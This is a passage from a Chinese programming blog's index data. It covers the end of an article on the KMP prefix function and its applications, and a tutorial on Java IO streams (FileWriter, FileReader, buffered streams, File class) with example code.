","date":"2024-03-27","objectID":"/articles/2024/03/kmp/:4:4","tags":["Algorithm","KMP","前缀函数"],"title":"前缀函数及其应用","uri":"/articles/2024/03/kmp/"},{"categories":["Algorithm"],"content":"字符串压缩 给定一个长度为 $n$ 的字符串 $s$，我们希望找到其最短的「压缩」表示，也即我们希望寻找一个最短的字符串 $t$，使得 $s$ 可以被 $t$ 的一份或多份拷贝的拼接表示。 显然，我们只需要找到 $t$ 的长度即可。知道了该长度，该问题的答案即为长度为该值的 $s$ 的前缀。 让我们计算 $s$ 的前缀函数。通过使用该函数的最后一个值 $\\pi[n - 1]$，我们定义值 $k = n - \\pi[n - 1]$。我们将证明，如果 $k$ 整除 $n$，那么 $k$ 就是答案，否则不存在一个有效的压缩，故答案为 $n$。 假定 $n$ 可被 $k$ 整除。那么字符串可被划分为长度为 $k$ 的若干块。根据前缀函数的定义，该字符串长度为 $n - k$ 的前缀等于其后缀。但是这意味着最后一个块同倒数第二个块相等，并且倒数第二个块同倒数第三个块相等，等等。作为其结果，所有块都是相等的，因此我们可以将字符串 $s$ 压缩至长度 $k$。 诚然，我们仍需证明该值为最优解。实际上，如果有一个比 $k$ 更小的压缩表示，那么前缀函数的最后一个值 $\\pi[n - 1]$ 必定比 $n - k$ 要大。因此 $k$ 就是答案。 现在假设 $n$ 不可以被 $k$ 整除，我们将通过反证法证明这意味着答案为 $n$2。假设其最小压缩表示 $r$ 的长度为 $p$（$p$ 整除 $n$），字符串 $s$ 被划分为 $n / p \\ge 2$ 块。那么前缀函数的最后一个值 $\\pi[n - 1]$ 必定大于 $n - p$（如果等于则 $n$ 可被 $k$ 整除），也即其所表示的后缀将部分的覆盖第一个块。现在考虑字符串的第二个块。该块有两种解释：第一种为 $r_0 r_1 \\dots r_{p - 1}$，另一种为 $r_{p - k} r_{p - k + 1} \\dots r_{p - 1} r_0 r_1 \\dots r_{p - k - 1}$。由于两种解释对应同一个字符串，因此可得到 $p$ 个方程组成的方程组，该方程组可简写为 $r_{(i + k) \\bmod p} = r_{i \\bmod p}$，其中 $\\cdot \\bmod p$ 表示模 $p$ 意义下的最小非负剩余。 $$ \\begin{gathered} \\overbrace{r_0 ~ r_1 ~ r_2 ~ r_3 ~ r_4 ~ r_5}^p ~ \\overbrace{r_0 ~ r_1 ~ r_2 ~ r_3 ~ r_4 r_5}^p \\ r_0 ~ r_1 ~ r_2 ~ r_3 ~ \\underbrace{\\overbrace{r_0 ~ r_1 ~ r_2 ~ r_3 ~ r_4 ~ r_5}^p ~ r_0 ~ r_1}_{\\pi[11] = 8} \\end{gathered} $$ 根据扩展欧几里得算法我们可以得到一组 $x$ 和 $y$ 使得 $xk + yp = \\gcd(k, p)$。通过与等式 $pk - kp = 0$ 适当叠加我们可以得到一组 $x’ \u003e 0$ 和 $y’ \u003c 0$ 使得 $x’k + y’p = \\gcd(k, p)$。这意味着通过不断应用前述方程组中的方程我们可以得到新的方程组 $r_{(i + \\gcd(k, p)) \\bmod p} = r_{i \\bmod p}$。 由于 $\\gcd(k, p)$ 整除 $p$，这意味着 $\\gcd(k, p)$ 是 $r$ 的一个周期。又因为 $\\pi[n - 1] \u003e n - p$，故有 $n - \\pi[n - 1] = k \u003c p$，所以 $\\gcd(k, p)$ 是一个比 $p$ 更小的 $r$ 的周期。因此字符串 $s$ 有一个长度为 $\\gcd(k, p) \u003c p$ 的压缩表示，同 $p$ 的最小性矛盾。 综上所述，不存在一个长度小于 $k$ 的压缩表示，因此答案为 $k$。 ","date":"2024-03-27","objectID":"/articles/2024/03/kmp/:4:5","tags":["Algorithm","KMP","前缀函数"],"title":"前缀函数及其应用","uri":"/articles/2024/03/kmp/"},{"categories":["Algorithm"],"content":"根据前缀函数构建一个自动机 让我们重新回到通过一个分隔符将两个字符串拼接的新字符串。对于字符串 $s$ 和 $t$ 我们计算 $s + # + t$ 的前缀函数。显然，因为 $#$ 是一个分隔符，前缀函数值永远不会超过 $|s|$。因此我们只需要存储字符串 $s + #$ 和其对应的前缀函数值，之后就可以动态计算对于之后所有字符的前缀函数值： $$ \\underbrace{s_0 ~ s_1 ~ \\dots ~ s_{n-1} ~ #}{\\text{need to store}} ~ \\underbrace{t_0 ~ t_1 ~ \\dots ~ t{m-1}}_{\\text{do not need to store}} $$ 实际上在这种情况下，知道 $t$ 的下一个字符 $c$ 以及之前位置的前缀函数值便足以计算下一个位置的前缀函数值，而不需要用到任何其它 $t$ 的字符和对应的前缀函数值。 换句话说，我们可以构造一个 自动机（一个有限状态机）：其状态为当前的前缀函数值，而从一个状态到另一个状态的转移则由下一个字符确定。 因此，即使没有字符串 $t$，我们同样可以应用构造转移表的算法构造一个转移表 $( \\text { old } \\pi , c ) \\rightarrow \\text { new } _ { - } \\pi$： void compute_automaton(string s, vector\u003cvector\u003cint\u003e\u003e\u0026 aut) { s += '#'; int n = s.size(); vector\u003cint\u003e pi = prefix_function(s); aut.assign(n, vector\u003cint\u003e(26)); for (int i = 0; i \u003c n; i++) { for (int c = 0; c \u003c 26; c++) { int j = i; while (j \u003e 0 \u0026\u0026 'a' + c != s[j]) j = pi[j - 1]; if ('a' + c == s[j]) j++; aut[i][c] = j; } } } 然而在这种形式下，对于小写字母表，算法的时间复杂度为 $O(|\\Sigma|n^2)$。注意到我们可以应用动态规划来利用表中已计算过的部分。只要我们从值 $j$ 变化到 $\\pi[j - 1]$，那么我们实际上在说转移 $(j, c)$ 所到达的状态同转移 $(\\pi[j - 1], c)$ 一样，但该答案我们之前已经精确计算过了。 void compute_automaton(string s, vector\u003cvector\u003cint\u003e\u003e\u0026 aut) { s += '#'; int n = s.size(); vector\u003cint\u003e pi = prefix_function(s); aut.assign(n, vector\u003cint\u003e(26)); for (int i = 0; i \u003c n; i++) { for (int c = 0; c \u003c 26; c++) { if (i \u003e 0 \u0026\u0026 'a' + c != s[i]) aut[i][c] = aut[pi[i - 1]][c]; else aut[i][c] = i + ('a' + c == s[i]); } } } 最终我们可在 $O(|\\Sigma|n)$ 的时间复杂度内构造该自动机。 该自动机在什么时候有用呢？首先，记得大部分时候我们为了一个目的使用字符串 $s + # + t$ 的前缀函数：寻找字符串 $s$ 在字符串 $t$ 中的所有出现。 因此使用该自动机的最直接的好处是 加速计算字符串 $s + # + t$ 的前缀函数。 通过构建 $s + #$ 的自动机，我们不再需要存储字符串 $s$ 以及其对应的前缀函数值。所有转移已经在表中计算过了。 但除此以外，还有第二个不那么直接的应用。我们可以在字符串 $t$ 是 某些通过一些规则构造的巨型字符串 时，使用该自动机加速计算。Gray 字符串，或者一个由一些短的输入串的递归组合所构造的字符串都是这种例子。 出于完整性考虑，我们来解决这样一个问题：给定一个数 $k \\le 10^5$，以及一个长度 $\\le 10^5$ 的字符串 $s$，我们需要计算 $s$ 在第 $k$ 个 Gray 字符串中的出现次数。回想起 Gray 字符串以下述方式定义： $$ \\begin{aligned} g_1 \u0026= \\mathtt{a}\\ g_2 \u0026= \\mathtt{aba}\\ g_3 \u0026= \\mathtt{abacaba}\\ g_4 \u0026= \\mathtt{abacabadabacaba} \\end{aligned} $$ 由于其天文数字般的长度，在这种情况下即使构造字符串 $t$ 都是不可能的：第 $k$ 个 Gray 字符串有 $2^k - 1$ 个字符。然而我们可以在仅仅知道开头若干前缀函数值的情况下，有效计算该字符串末尾的前缀函数值。 除了自动机之外，我们同时需要计算值 $G[i][j]$：在从状态 $j$ 开始处理 $g_i$ 后的自动机的状态，以及值 $K[i][j]$：当从状态 $j$ 开始处理 $g_i$ 后，$s$ 在 $g_i$ 中的出现次数。实际上 $K[i][j]$ 为在执行操作时前缀函数取值为 $|s|$ 的次数。易得问题的答案为 $K[k][0]$。 我们该如何计算这些值呢？首先根据定义，初始条件为 $G[0][j] = j$ 以及 $K[0][j] = 0$。之后所有值可以通过先前的值以及使用自动机计算得到。为了对某个 $i$ 计算相应值，回想起字符串 $g_i$ 由 $g_{i - 1}$，字母表中第 $i$ 个字符，以及 $g_{i - 1}$ 三者拼接而成。因此自动机会途径下列状态： $$ \\begin{gathered} \\text{mid} = \\text{aut}[G[i - 1][j]][i] \\ G[i][j] = G[i - 1][\\text{mid}] \\end{gathered} $$ $K[i][j]$ 的值同样可被简单计算。 $$ K[i][j] = K[i - 1][j] + [\\text{mid} == |s|] + K[i - 1][\\text{mid}] $$ 其中 $[\\cdot]$ 当其中表达式取值为真时值为 $1$，否则为 $0$。综上，我们已经可以解决关于 Gray 字符串的问题，以及一大类与之类似的问题。举例来说，应用同样的方法可以解决下列问题：给定一个字符串 $s$ 以及一些模式 $t_i$，其中每个模式以下列方式给出：该模式由普通字符组成，当中可能以 $t_{k}^{\\text{cnt}}$ 的形式递归插入先前的字符串，也即在该位置我们必须插入字符串 $t_k$ $\\text{cnt}$ 次。以下是这些模式的一个例子： $$ \\begin{aligned} t_1 \u0026= \\mathtt{abdeca} \\ t_2 \u0026= \\mathtt{abc} + t_1^{30} + \\mathtt{abd} \\ t_3 \u0026= t_2^{50} + t_1^{100} \\ t_4 \u0026= t_2^{10} + t_3^{100} \\end{aligned} $$ 递归代入会使字符串长度爆炸式增长，他们的长度甚至可以达到 $100^{100}$ 的数量级。而我们必须找到字符串 $s$ 在每个字符串中的出现次数。 该问题同样可通过构造前缀函数的自动机解决。同之前一样，我们利用先前计算过的结果对每个模式计算其转移然后相应统计答案即可。 ","date":"2024-03-27","objectID":"/articles/2024/03/kmp/:4:6","tags":["Algorithm","KMP","前缀函数"],"title":"前缀函数及其应用","uri":"/articles/2024/03/kmp/"},{"categories":["Algorithm"],"content":"参考资料与注释 本页面主要译自博文 Префикс-функция. Алгоритм Кнута-Морриса-Пратта 与其英文翻译版 Prefix function. Knuth–Morris–Pratt algorithm。其中俄文版版权协议为 Public Domain + Leave a Link；英文版版权协议为 CC-BY-SA 4.0。 金策 - 字符串算法选讲 ↩︎ 在俄文版及英文版中该部分证明均疑似有误。本文章中的该部分证明由作者自行添加。 ↩︎ ","date":"2024-03-27","objectID":"/articles/2024/03/kmp/:5:0","tags":["Algorithm","KMP","前缀函数"],"title":"前缀函数及其应用","uri":"/articles/2024/03/kmp/"},{"categories":["Java"],"content":"目录 IO流基础: 关联其他文件的备注, IO流概述和分类 FileWriter: FileWriter概述, 构造方法和成员方法, FileWriter写数据的方法, FileWriter写数据的换行, 追加写入 FileReader: FileReader概述, FileReader读数据的方法, IO流案例之复制文本文件 字符缓冲流: 字符缓冲流概述, 字符缓冲流的特殊功能：newLine()和readLine(), 字符缓冲流复制文件 字符流读写应用: 复制文本文件的5种方法, 集合数据的读写应用 File类: File类概述, File类的构造方法, File类的创建/删除/判断/获取/修改功能, File的方法应用 IO流分类: 根据流向(输入流/输出流)和数据类型分(字节流/字符流), 字节流对象, 分别用字节流和字符流复制图片, 小结 输入输出流: 标准输入输出流概述, 两个转换流, OutputStreamWriter 打印流: 打印流概述, 打印流特有功能(自动换行/自动刷新), 使用打印流复制文件 对象操作流: 对象操作流概述, 使用对象操作流读写数据, 序列化与反序列化, 异常处理, 序列化中的serialVersionUID号 Properties: Properties概述(属性列表), Properties的构造和简单应用, roperties与IO流结合的功能(list, load, store) 编码表: 编码表概述, Java中字符串的编码, 字符流中的编码 ","date":"2024-03-25","objectID":"/articles/2024/03/java-io%E6%B5%81/:0:1","tags":["Java","语法"],"title":"Java IO流","uri":"/articles/2024/03/java-io%E6%B5%81/"},{"categories":["Java"],"content":"IO流基础 ","date":"2024-03-25","objectID":"/articles/2024/03/java-io%E6%B5%81/:1:0","tags":["Java","语法"],"title":"Java IO流","uri":"/articles/2024/03/java-io%E6%B5%81/"},{"categories":["Java"],"content":"备注： 本部分首次出现是在：Java常用API: IO流 这里选取关键内容整理保留，并进行了新的标题划分 ","date":"2024-03-25","objectID":"/articles/2024/03/java-io%E6%B5%81/:1:1","tags":["Java","语法"],"title":"Java IO流","uri":"/articles/2024/03/java-io%E6%B5%81/"},{"categories":["Java"],"content":"IO流概述和分类 引入： 类似ArrayList的集合类，存储数据的有效范围仅为该代码运行期间，在内存中临时存储，再次打开时输入的数据已丢失。而IO流技术可以永久存储。 概述： IO流用来处理设备之间的传输问题，包括文件复制、上传/下载文件等。 IO流分类： 输出流 (写数据)：FileWriter 输入流 (读数据)：FileReader 注：输入输出说的是Java程序本位下的输入输出，输入相当于读到Java程序，输出相当于从Java程序写数据到别的地方 图示： ","date":"2024-03-25","objectID":"/articles/2024/03/java-io%E6%B5%81/:1:2","tags":["Java","语法"],"title":"Java IO流","uri":"/articles/2024/03/java-io%E6%B5%81/"},{"categories":["Java"],"content":"返回目录 ","date":"2024-03-25","objectID":"/articles/2024/03/java-io%E6%B5%81/:1:3","tags":["Java","语法"],"title":"Java IO流","uri":"/articles/2024/03/java-io%E6%B5%81/"},{"categories":["Java"],"content":"FileWriter ","date":"2024-03-25","objectID":"/articles/2024/03/java-io%E6%B5%81/:2:0","tags":["Java","语法"],"title":"Java IO流","uri":"/articles/2024/03/java-io%E6%B5%81/"},{"categories":["Java"],"content":"FileWriter概述 输出流写数据，通过阅读API学习 java.io包下： 需要导包 import java.io.FileWriter; 输出流写数据的步骤： 创建输出流对象；\u003c创建文件时需要调用系统资源\u003e 调用输出流对象的写数据的方法，并flush刷新缓冲区； 释放资源。\u003c即通知系统释放和该文件相关的资源，因为创建输出流对象是调用系统资源创建的\u003e ","date":"2024-03-25","objectID":"/articles/2024/03/java-io%E6%B5%81/:2:1","tags":["Java","语法"],"title":"Java IO流","uri":"/articles/2024/03/java-io%E6%B5%81/"},{"categories":["Java"],"content":"FileWriter的构造方法和成员方法 构造方法： FileWriter(String fileName): 传递一个文件名称 \u003c或路径+文件名\u003e 成员方法： void write(String str): 写入数据 void flush(): 刷新缓冲区 数据不会直接写到文件，而是写到了内存缓冲区，flush刷新后显示 void close(): 释放调用的系统资源，写入数据不多时自带flush()步骤。 创建输出流对象做了哪些事情：FileWriter fw = new FileWriter(\"d:\\\\a.txt\") 调用系统资源创建了一个文件；(没有路径所指文件时会自动创建) 创建输出流对象； 把输出流对象指向该文件。 写数据方法的路径问题： 相对路径：相对当前项目而言，在项目的根目录下(注意是\"项目\") 示例：FileWriter fw = new FileWriter(\"a.txt\")//不加盘符的文件名; eclipse中显示相对路径的文件： 选中项目project – 右键 – refresh，即可在项目下出现相应的文件(a.txt) 注意：右键的是项目名，不是包名或者Java程序名 绝对路径：指明盘符的具体路径 示例：FileWriter fw = new FileWriter(\"d:\\\\a.txt\");//加了盘符位置的文件名 注意：mac中路径为’/users/xx/…' close()和flush()方法： flush(): 刷新缓冲区；之后流对象还可以继续使用。 close(): 先刷新缓冲区，后通知系统释放资源；之后流对象不可以再使用了。 close()做两步，因此即使write()之后没有flush(), close()的时候也会自动刷新。 写入内容较少时，可以省略flush(). 代码示例：(注意导包和抛出异常) import java.io.FileWriter; import java.io.IOException; public class FileWriterDemo{ public static void main(String[] args) throws IOException { //创建输出流对象 FileWriter fw = new FileWriter(\"d:\\\\a.txt\");//没有该文件时会自动创建，使用绝对路径 //如果不带盘符地址，默认为所写入的文件在代码项目所在路径下的相对路径 //调用数据流对象的写数据方法 fw.write(\"IO流你好\");//写一个字符串数据 fw.flush();//数据没有直接写到文件，而是写到了内存缓冲区，刷新缓冲区后才会显示 fw.write(\"javaee\"); fw.flush(); fw.close();//释放资源，否则fw会一直占用中 //fw.write(\"123\"); //close()之后再写数据会报错 } } ","date":"2024-03-25","objectID":"/articles/2024/03/java-io%E6%B5%81/:2:2","tags":["Java","语法"],"title":"Java IO流","uri":"/articles/2024/03/java-io%E6%B5%81/"},{"categories":["Java"],"content":"FileWriter写数据的方法 void write(String str): 写入一个字符串数据 代码示例：fw.write(\"abcde\"); fw.close(); //写入\"abcde\"; 此处写入较少可省略flush() void write(String str, int index, int lens): 写入一个字符串中的一部分数据，即从索引值index开始，长度为lens的子串 代码示例：fw.write(\"abcde\", 1, 3); fw.close(); //可写入\"bcd\" void write(int ch): 写入一个字符数据 为int类型的好处是：既可以写char类型的数据，也可以写char对应的int类型的值，比如’a’和97均可 代码示例：fw.write('a');和fw.write(97);均可写入字符’a' void write(char[] chs): 写入一个字符数组数据 代码示例：char[] chs = {'a','b','c','d','e'}; fw.write(chs);//写入的数据在文件中的形式是\"abcde\"不带引号 void write(char[] chs, int index, int lens): 写入一个字符数组的一部分数据 代码示例：char[] chs = {'a','b','c','d','e'}; fw.write(chs,2,3);//写入的数据在文件中的形式是\"cde\"不带引号 ","date":"2024-03-25","objectID":"/articles/2024/03/java-io%E6%B5%81/:2:3","tags":["Java","语法"],"title":"Java IO流","uri":"/articles/2024/03/java-io%E6%B5%81/"},{"categories":["Java"],"content":"FileWriter写数据的换行 用换行符可以实现换行 代码示例：for循环中：fw.write(x); fw.write(\"\\r\\n\"); 不同系统识别的换行符不同： Windows: \\r\\n linux: \\n mac: \\r 注意：如果在Windows用\\n写入，则自带的记事本打开无法识别，显得的仍然是没有换行的；而用编辑器打开可以识别。 缓冲流有特殊的换行方法 BufferedWriter: void newLine() – 可根据系统自动匹配换行符，详见缓冲流的特殊功能部分。 代码示例：bw.newLine();//取代bw.write(\"\\r\\n\")； ","date":"2024-03-25","objectID":"/articles/2024/03/java-io%E6%B5%81/:2:4","tags":["Java","语法"],"title":"Java IO流","uri":"/articles/2024/03/java-io%E6%B5%81/"},{"categories":["Java"],"content":"FileWriter写数据的追加写入 构造方法：FileWriter(Sting str, Boolean append) append默认为false，当需要追加时，可以在第二个参数位置写true 这时再运行，会将新的内容追加到文件中 代码示例： FileWriter fw = new FileWriter(\"c.txt\",true); //默认为false，写为true时表示追加写入 fw.write(\"xxxxxx\");//这时会追加新的xxxx内容写入到文件 ","date":"2024-03-25","objectID":"/articles/2024/03/java-io%E6%B5%81/:2:5","tags":["Java","语法"],"title":"Java IO流","uri":"/articles/2024/03/java-io%E6%B5%81/"},{"categories":["Java"],"content":"返回目录 ","date":"2024-03-25","objectID":"/articles/2024/03/java-io%E6%B5%81/:2:6","tags":["Java","语法"],"title":"Java IO流","uri":"/articles/2024/03/java-io%E6%B5%81/"},{"categories":["Java"],"content":"FileReader ","date":"2024-03-25","objectID":"/articles/2024/03/java-io%E6%B5%81/:3:0","tags":["Java","语法"],"title":"Java IO流","uri":"/articles/2024/03/java-io%E6%B5%81/"},{"categories":["Java"],"content":"FileReader概述 输入流写数据，通过阅读API学习 java.io包下：因此需要导包 import java.io.FileReader; 构造方法：FileReader(String filename) – 传递文件名称 注意：仍然需要导包和抛出异常 输入流写数据的步骤： 创建输入流对象; 调用输入流对象的读数据方法; 释放资源. ","date":"2024-03-25","objectID":"/articles/2024/03/java-io%E6%B5%81/:3:1","tags":["Java","语法"],"title":"Java IO流","uri":"/articles/2024/03/java-io%E6%B5%81/"},{"categories":["Java"],"content":"FileReader读数据的方法： int read(): 一次读取一个字符，且存储类型为int，即字符对应的int值 可通过(char)强转为char类型 再次使用本方法时：自动读取下一个字符 \u003c不需要像写数据一样声明追加\u003e 当没有可读取数据时，返回-1 \u003c可作为读取循环结束的判断条件\u003e 空格、回车等也可以读取到，不需要在输出语句(syso)里加ln 例如：读取某个.java文件，可以在控制台输出带格式的代码 循环时while语句的妙用： while((ch = fr.read()) != -1){...} 做了三步：read()读数据; 读取到的结果赋值给ch; 判断ch的值是否为-1 void close(): 读取结束后记得关闭释放资源 代码示例：fr.close(); 读数据常见异常： java.io.FileNotFoundException: fr.txt (系统找不到指定文件) 代码示例： import java.io.fileNotFoundException; import java.io.FileReader; import java.io.IOException; public class FileReaderDemo{ public static void main(String[] args) throws IOException{ FileReader fr = new FileReader(\"fr.txt\");//创建输入流对象; fr.txt内容为：\"abc\" /* int ch = fr.read();//调用输入流对象的读取方法 System.out.println(ch);//97 System.out.println((char)ch);//a */ int ch; while((ch = fr.read()) != -1){//这条语句做了三个步骤 System.out.print(); } fr.close();//释放资源 } } int read(char[] cbuf) 一次读取一个字符数组的数据，返回\u003c实际\u003e读取的字符个数 步骤仍然是：创建对象；调用读数据方法；释放资源。 char[] chs = new char[1024]; 自定义字符数组，相当于读取到自定义数组中，数组长度为每次读取的字符个数 通常，数组长度定义为1024或1024的整数倍：因为MB,GB等的换算是1024 读取为空时，返回-1 \u003c可作为循环结束的条件\u003e 会读取回车 \\r\\n，占用2个长度 上一次的读取会被下一次替换，当下一次读取不够全部替换上一次读取时，上一次的读取会遗留在存储字符数组中 详见下方图解 输入推荐用System.out.println(new String(chs,0,len)); 代码示例： //创建输入流对象 FileReader fr = new FileReader(\"a.txt\"); char[] chs = new char[1024]; int len; while((len = fr.read(chs)) != -1){ System.out.print(new String(chs,0,len));//注意syso不要写ln，读取了回车等格式符 } fr.close(); FileReader两种读数据方法对比图解 ","date":"2024-03-25","objectID":"/articles/2024/03/java-io%E6%B5%81/:3:2","tags":["Java","语法"],"title":"Java IO流","uri":"/articles/2024/03/java-io%E6%B5%81/"},{"categories":["Java"],"content":"IO流案例：复制文本文件 题目： 文件复制：将相同项目下的a.java中的内容复制到b.java文件中 文件复制的套路： 数据源：a.java – 读数据 – FileReader 目的地：b.java – 写数据 – FileWriter 注意点： 同时有读写时，close()先关哪个都可，推荐先关write. ‘一次读取一个字符’的代码示例： FileReader fr = new FileReader(\"a.java\");//同项目下，用相对路径即可。下同。 FileWriter fw = new FileWriter(\"b.java\"); //一次读取一个字符的定义方法 int ch;//定义返回值flag while((ch = fr.read()) != -1){//参考按单个字符读取的循环 fw.write(ch); } fw.close(); fr.close(); ‘一次读取一个字符数组’的代码示例： FileReader fr = new FileReader(\"a.java\");//同项目下，用相对路径即可。下同。 FileWriter fw = new FileWriter(\"b.java\"); //一次读取一个字符数组的定义方法 char[] chs = new char[1024];//定义读取的字符数组 int len;//定义返回值flag while((len = fr.read(chs)) != -1){//参考按单个字符读取的循环 fw.write(chs,0,len); } fw.close(); fr.close(); ","date":"2024-03-25","objectID":"/articles/2024/03/java-io%E6%B5%81/:3:3","tags":["Java","语法"],"title":"Java IO流","uri":"/articles/2024/03/java-io%E6%B5%81/"},{"categories":["Java"],"content":"返回目录 ","date":"2024-03-25","objectID":"/articles/2024/03/java-io%E6%B5%81/:3:4","tags":["Java","语法"],"title":"Java IO流","uri":"/articles/2024/03/java-io%E6%B5%81/"},{"categories":["Java"],"content":"字符缓冲流 ","date":"2024-03-25","objectID":"/articles/2024/03/java-io%E6%B5%81/:4:0","tags":["Java","语法"],"title":"Java IO流","uri":"/articles/2024/03/java-io%E6%B5%81/"},{"categories":["Java"],"content":"字符缓冲流概述 BufferedWriter: 将文本写入字符输出流，缓冲各个字符，从而提供单个字符、数组、字符串的高效写入 注意参数：传入一个new的输出流对象 代码示例：BufferedWriter bw = new BufferedWriter(new FileWriter(\"bw.txt\")); 调用使用同FileWriter() BufferedReader: 从字符输入流中读取文本，缓冲各个字符，从而提供单个字符、数组、行的高效读取 注意参数：传入一个new的输入流对象 代码示例：BufferedReader br = new BufferedReader(new FileReader(\"br.txt\")); 仍然分为读取单个字符和读取字符数组两种方式。 导包： import java.io.BufferedWriter/BufferedReader; ","date":"2024-03-25","objectID":"/articles/2024/03/java-io%E6%B5%81/:4:1","tags":["Java","语法"],"title":"Java IO流","uri":"/articles/2024/03/java-io%E6%B5%81/"},{"categories":["Java"],"content":"用缓冲流复制文件 注意：记得开始导包和抛出异常 数据源：a.java – 读数据 – FileReader – 高效读数据 – BufferedReader 目的地：b.java – 写数据 – FileWriter – 高效写数据 – BufferedWriter 代码示例： import java.io.* ... public static void main(String[] args) throws IOException{ BufferedReader br = new BufferedReader(new FileReader(\"a.java\")); BufferedWriter bw = new BufferedWriter(new FileWriter(\"b.java\")); /* //一次读写一个字符 int ch; while((ch = br.read()) != -1){ bw.write((char)ch); } */ //一次读取一个字符数组 char[] chs = new char[1024]; int len; while((len = br.read(chs)) != -1){ bw.write(chs,0,len);//不要忘记参数，防止写入未覆盖的遗留数据 } } ","date":"2024-03-25","objectID":"/articles/2024/03/java-io%E6%B5%81/:4:2","tags":["Java","语法"],"title":"Java IO流","uri":"/articles/2024/03/java-io%E6%B5%81/"},{"categories":["Java"],"content":"字符缓冲流的特殊功能 字符缓冲流： 包含缓冲输入/输出流：BufferedWriter 和 BufferedReader 创建缓冲流对象：构造方法参数为对应的基本输入/输出流对象，而不是直接传入文件。 代码示例：BufferedReader br = new BufferedReader(new FileReader(\"br.txt\")); BufferedWriter: void newLine(): 写一个换行符，这个换行符由系统决定 不需要再判断系统换行符，取代之前的fw.write(\"\\r\\n\"); 代码示例: bw.newLine(); BufferedReader: String readLine(): 一次读取一行数据，但不读取换行符 (但读取空格) 返回值是字符串格式 读取空格：所以不用担心格式会乱，只需要加上换行即可 读取为空时返回null，可以作为循环结束的判断语句 代码示例： BufferedReader br = new BufferedReader(new FileReader(\"br.txt\")); String line; while((line = br.readLine()) != null){//这里同时做了三步，同上 (读取、赋值、判断) System.out.println();//readLine()不读取换行符，因此syso语句需要加上`ln` } br.close(); 导包注意点： 用字符缓冲流时，BufferedWriter/BufferedReader和FileWriter/FileReader都需要导入 当然还有IO流异常 IOException 使用字符缓冲流的特殊方法复制文本文件 代码示例： public class CopyFileDemo{ public static void main(String[] args) throws IOException{ //创建缓冲流对象 BufferedReader br = new BufferedReader(new FileReader(\"a.txt\")); BufferedWriter bw = new BufferedWriter(new FileWriter(\"b.txt\")); String line; while((line = br.readLine()) != null){ bw.write(line); bw.newLine() bw.flush(); } bw.close(); br.close() } } ","date":"2024-03-25","objectID":"/articles/2024/03/java-io%E6%B5%81/:4:3","tags":["Java","语法"],"title":"Java IO流","uri":"/articles/2024/03/java-io%E6%B5%81/"},{"categories":["Java"],"content":"返回目录 ","date":"2024-03-25","objectID":"/articles/2024/03/java-io%E6%B5%81/:4:4","tags":["Java","语法"],"title":"Java IO流","uri":"/articles/2024/03/java-io%E6%B5%81/"},{"categories":["Java"],"content":"字符流读写应用 ","date":"2024-03-25","objectID":"/articles/2024/03/java-io%E6%B5%81/:5:0","tags":["Java","语法"],"title":"Java IO流","uri":"/articles/2024/03/java-io%E6%B5%81/"},{"categories":["Java"],"content":"复制文本文件的5种方法 基本流一次读写一个字符 基本流一次读写一个字符数组 缓冲流一次读写一个字符 注意：缓冲流也可以用基本流的方法br.read()进行读取 缓冲流一次读写一个字符数组 缓冲流一次读写一个字符串 \u003c推荐，重点掌握\u003e 用缓冲流的特殊方法进行读写 br.readLine() and bw.newLine(). 注： 写代码时可以将读写的文件名和五种方法单独定义，提高复用性 此处涉及异常抛出注意点： 当所调用的方法抛出了异常时，所调用的方法也需要抛出异常，即main方法也需要加throws IOException ","date":"2024-03-25","objectID":"/articles/2024/03/java-io%E6%B5%81/:5:1","tags":["Java","语法"],"title":"Java IO流","uri":"/articles/2024/03/java-io%E6%B5%81/"},{"categories":["Java"],"content":"集合数据的读写应用 IO流：将集合中的数据写入文本文件 题目： 把ArrayList集合中的字符串数据存储到文本文件，每一个字符串元素作为文件中的一行数据 步骤： 创建集合对象 往集合中添加元素 创建输出缓冲流对象 遍历集合，得到每一个字符串元素，然后把该字符串元素作为数据写入到文本文件 释放资源 代码示例： import java.io.*; //(ctrl+shift+o大法好) import java.util.ArrayList; public class ArrayListToFile{ public static void main(String[] args) throws IOException{ ArrayList\u003cString\u003e array = new ArrayList\u003c\u003e(); array.add(\"hello\"); array.add(\"Java\"); array.add(\"world\"); BufferedWriter bw = new BufferedWriter(new FileWriter(\"a.txt\")); for(int i=0;i\u003carray.size();i++){ String s = array.get(i); bw.write(s); bw.newLine(); bw.flush(); } bw.close(); } } //运行，并刷新项目 IO流：将文本文件中的数据读取并存入集合中 题目： 文本文件中读取数据到ArrayList中，并遍历集合；每一行数据作为一个字符串元素。 步骤： 创建输入缓冲流对象； 创建集合对象； 去读数据，每次读取一行数据，把该行数据作为一个元素存储到集合中； 释放资源； 遍历集合. 代码示例： import java.io.*; //(ctrl+shift+o大法好) import java.util.ArrayList; public class ArrayListToFile{ public static void main(String[] args) throws IOException{ BufferedReader br = new BufferedReader(new FileReader(\"a.txt\")); ArrayList\u003cString\u003e array = new ArrayList\u003c\u003e(); String line; while((line = br.readLine()) != null){ array.add(line); } br.close(); for(int i=0;i\u003carray.size();i++){ String s = array.get(i); System.out.println(s); } } } //运行，并刷新项目 ","date":"2024-03-25","objectID":"/articles/2024/03/java-io%E6%B5%81/:5:2","tags":["Java","语法"],"title":"Java IO流","uri":"/articles/2024/03/java-io%E6%B5%81/"},{"categories":["Java"],"content":"返回目录 ","date":"2024-03-25","objectID":"/articles/2024/03/java-io%E6%B5%81/:5:3","tags":["Java","语法"],"title":"Java IO流","uri":"/articles/2024/03/java-io%E6%B5%81/"},{"categories":["Java"],"content":"File类 ","date":"2024-03-25","objectID":"/articles/2024/03/java-io%E6%B5%81/:6:0","tags":["Java","语法"],"title":"Java IO流","uri":"/articles/2024/03/java-io%E6%B5%81/"},{"categories":["Java"],"content":"File类概述 文件和目录路径名的抽象表示形式。 目录：即路径 File类的实例是不可变的。 也就是说，一旦创建，File 对象表示的抽象路径名将永不改变 位置：java.io包 注意不同系统的路径表示不同： Windows：与注释相反方向的斜杠分割路径 “D:\\abc\\file.txt” mac: 与注释相同方向的斜杠分割路径 “/users/abc/..” ","date":"2024-03-25","objectID":"/articles/2024/03/java-io%E6%B5%81/:6:1","tags":["Java","语法"],"title":"Java IO流","uri":"/articles/2024/03/java-io%E6%B5%81/"},{"categories":["Java"],"content":"File的构造方法 背景： 在D盘下创建文件夹a, 并在文件夹a中创建文件b.txt 路径：D:\\\\a\\\\b.txt File(String pathname): 将指定的路径名转换成一个File对象 示例：File f = new File(\"D:\\\\a\\\\b.txt\"); 注： 如果删掉b.txt文件再运行，没有新建b.txt文件 因此：本条语句只是创建了一个File对象指向特定路径而已，没有做其他事 File(String parent, String child): 